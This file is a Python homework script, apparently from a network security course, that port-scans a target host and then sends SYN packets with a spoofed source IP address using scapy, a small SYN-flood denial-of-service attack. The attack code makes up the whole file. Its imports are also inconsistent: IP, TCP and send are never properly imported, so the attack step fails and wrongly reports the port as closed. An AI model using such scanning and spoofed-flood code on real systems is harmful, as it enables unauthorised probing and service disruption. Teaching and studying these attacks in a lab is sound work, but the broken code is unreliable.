#! /usr/bin/env python3

# HW#: 08
# Name: Max Chi
# ECN Login: chi19
# Due Date: 3/20/2018

import sys
import os
import socket
#from scapy.all import * #unable to install scapy this way
import scapy #downloaded the scapy folder from github and directly import with this method

class TcpAttack(object):
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    ### referenced professor Kak's port scan from lecture 16    
    def scanTarget(self, rangeStart, rangeEnd):
        f = open("openports.txt", "w")
        
        ### test range of ports
        for x_port in range(rangeStart, rangeEnd):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, x_port))
                f.write(str(x_port))
                f.write("\n")
            except Exception as e:
                pass
        f.close()


    ### referenced professor Kak's DoS5.py program from lecture 16     
    def attackTarget(self, port):
        #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #sock.settimeout(0.1)
        try:
            #sock.connect((self.targetIP, port))
            ### sends 5 packets 
            for x in range(5):
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IP_header / TCP_header
                send(packet)
            return 1
        except Exception as e:
            print("Attack is unsuccessful, Port is not open!")
            return 0
        
if __name__ == "__main__":
    spoofIP = '10.0.0.3' #'192.137.43.101' '10.0.0.3'
    targetIP = '10.186.104.64' #'10.186.68.5' #'128.46.75.105' #my own ip address, and constatines ip address at the time
    rangeStart= 20
    rangeEnd = 5000
    port = 3000
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if (Tcp.attackTarget(port)):
        print("Port {0} was open to attack".format(port))
